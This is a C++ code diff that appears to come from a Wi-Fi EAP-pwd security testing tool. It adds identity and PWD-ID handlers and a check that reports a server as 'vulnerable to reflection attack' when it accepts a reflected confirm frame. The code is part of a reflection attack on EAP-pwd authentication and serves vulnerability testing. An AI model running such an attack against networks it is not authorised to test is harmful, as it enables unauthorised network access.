@@ -130,6 +130,44 @@ vector<uint8_t> reflect_confirm(const EapPwdFrame& request){
 	return reflect_pwd_frame(request, PWD_OPCODE_CONFIRM);
 }
 
+bool send_eap_normal_EAP(EAP_Att &eap_att){
+	// EAP-Identity
+	uint8_t eap_id = 0;
+	const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
+	if(!eapol){ log(LogLevel::WARNING, "No EAP-Identity request"); return true; }
+	log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<int>(eap_id));
+	send_eapol(eap_att, build_identity_response(eap_id, eap_att.identity));
+	return false;
+}
+
+bool send_eap_normal_EAP_pwd_ID(EAP_Att &eap_att){
+	// PWD-ID
+	optional<EapPwdFrame> frame;
+	const auto eapol = wait_eapol(eap_att,[&](const vector<uint8_t>& e){
+		const auto f = parse_eap_pwd(e);
+		if(f && f->opcode == PWD_OPCODE_ID){ frame = f; return true; }
+		return false;
+	});
+	if(!eapol){ log(LogLevel::WARNING, "EAP-pwd exchange ended without EAP-Success"); return true; }
+	log(LogLevel::INFO, "EAP-PWD-ID Request");
+	send_eapol(eap_att, build_pwd_id_response(*frame, eap_att.identity));
+	return false;
+}
+
+bool eap_pwd_wait_for_success(EAP_Att &eap_att){
+	// Wait for EAP-Success after confirm
+	const auto eapol = wait_eapol(eap_att, [](const vector<uint8_t>&){
+		return false;
+	});
+	if(!eapol){ log(LogLevel::WARNING, "EAP exchange ended without EAP-Success"); return false; }
+	if(eapol->empty()){
+		log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!");
+		return true;
+	}
+	log(LogLevel::WARNING, "EAP ended without EAP-Success");
+	return false;
+}
+
 bool do_auth(EAP_Att &eap_att){
 
 	Dot11Authentication auth;
